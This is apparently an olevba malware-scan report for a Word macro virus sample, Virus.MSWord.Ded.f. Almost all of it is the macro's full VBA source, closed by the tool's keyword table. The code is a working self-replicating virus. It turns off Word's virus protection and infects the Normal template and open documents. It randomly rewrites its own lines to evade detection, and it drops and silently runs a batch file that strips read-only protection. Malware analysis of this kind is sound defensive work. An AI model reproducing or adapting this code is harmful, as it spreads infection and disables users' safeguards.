olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.f-3cbc595d6462dd9b8ef16aae614f20dbf9ae24be
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.f-3cbc595d6462dd9b8ef16aae614f20dbf9ae24be - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
     Private Sub _
Document_New()

        End Sub
'9.637774
          Private _
Sub Document_Close()

           On _
Error GoTo skam

  Options. _
              VirusProtection = False

          SWL
'33.61163
     ABS99
'42.56033
skam:
'8.957314
           End Sub
'72.16117
      Private Sub SWL()
'42.59714
     Application. _
                          ShowVisualBasicEditor = False

              If Not _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

        For _
I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

    d = NormalTemplate. _
VBProject.VBComponents(1).CodeModule.Lines(I, 1)

 If _
Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

            While Mid(d, _
Len(d) - 1, 2) = " _"

      I _
= I + 1

        d = Left(d, Len(d) _
- 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

              Wend
'95.43525
              d = _
e(d)

            ActiveDocument. _
                            VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

    End If
'90.69127
           Next I
'36.27004
       ActiveDocument. _
                                     SaveAs AddToRecentFiles:=False

   End If
'87.02004
End Sub
'90.91909
              Private Sub _
ABS99()

     If Not NormalTemplate. _
 VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

 f (NormalTemplate. _
            FullName)

   For I = _
1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

              d = ActiveDocument.VBProject. _
VBComponents(1).CodeModule.Lines(I, 1)

        If Len(d) _
> 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

 While _
Mid(d, Len(d) - 1, 2) = " _"

            I = _
I + 1

        d = Left(d, _
Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

       Wend
'95.04152
        d _
= e(d)

  NormalTemplate.VBProject. _
   VBComponents(1).CodeModule.InsertLines I * 2, d

             End If
'29.928
            Next I
'63.33987
 NormalTemplate. _
   Save

         End If
'4.384488
         End Sub
'4.367179
 Private Function _
e(aString) As String

           aString _
= LTrim(aString)

          aString = RTrim(aString)
'62.57433
 If aString = "Sub " & "Vc()" Then
'53.55306
             aString _
= "Sub " & "ViewVBCode()"

       Else
'98.58498
            If aString = "Sub " & "ViewVBCode()" Then
'60.07596
            aString _
= "Sub " & "Vc()"

 End If
'61.56798
   End _
If

       For _
I = 1 To Len(aString) - 1

         If _
Mid(aString, I, 1) = "." Then

              If Not _
Mid(aString, I - 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

      If Not Mid(aString, I + 1, 1) _
= Chr$(34) Then

    e _
= Left(aString, I - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - I)

 For _
j = 1 To Int(15 * Rnd)

   e = " " & e
'57.74265
       Next j
'78.44582
Exit _
Function

             End If
'30.3376
            End If
'26.83433
              Else
'31.48093
 If Mid(aString, I, _
1) = " " And Int(3 * Rnd) = 1 And I > 1 Then

If _
Not Mid(aString, I + 1, 1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

            e = Left(aString, I - 1) & " _" & _
Chr$(13) & Right(aString, Len(aString) - I)

       For _
j = 1 To Int(15 * Rnd)

             e = " " & e
'10.19003
       Next j
'56.59349
  Exit _
Function

              End _
If

     End _
If

          End _
If

   Next I
'45.99786
       e = _
aString & Chr$(13) & "'" & (100 * Rnd)

    Count = Int(15 * Rnd)
'99.95895
     For j = 1 _
To Count

     e = " " & e
'74.26125
  Next j
'60.429
End _
Function

   Private Sub f(fName)
'99.71515
  If _
GetAttr(fName) And vbReadOnly Then

   Open _
Dir(fName) & ".bat" For Append As #1

     Print _
#1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)

 Print #1, "del " & _
Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

            Close _
#1

  shellResult = _
Shell(Dir(fName) & ".bat", vbHide)

        End If
'47.94405
             End Sub
'60.58485
           Sub Vc()
'51.48963
        For _
aDoc = 1 To Documents.Count

          For _
I = 1 To Documents(aDoc).VBProject.VBComponents(1).CodeModule.CountOfLines

              Documents(aDoc). _
VBProject.VBComponents(1).CodeModule.DeleteLines 1

             Next _
I

             Next aDoc
'22.45269
       For _
I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

         NormalTemplate. _
                                   VBProject.VBComponents(1).CodeModule.DeleteLines 1

           Next I
'21.68937
      Application. _
ShowVisualBasicEditor = True

            End _
Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

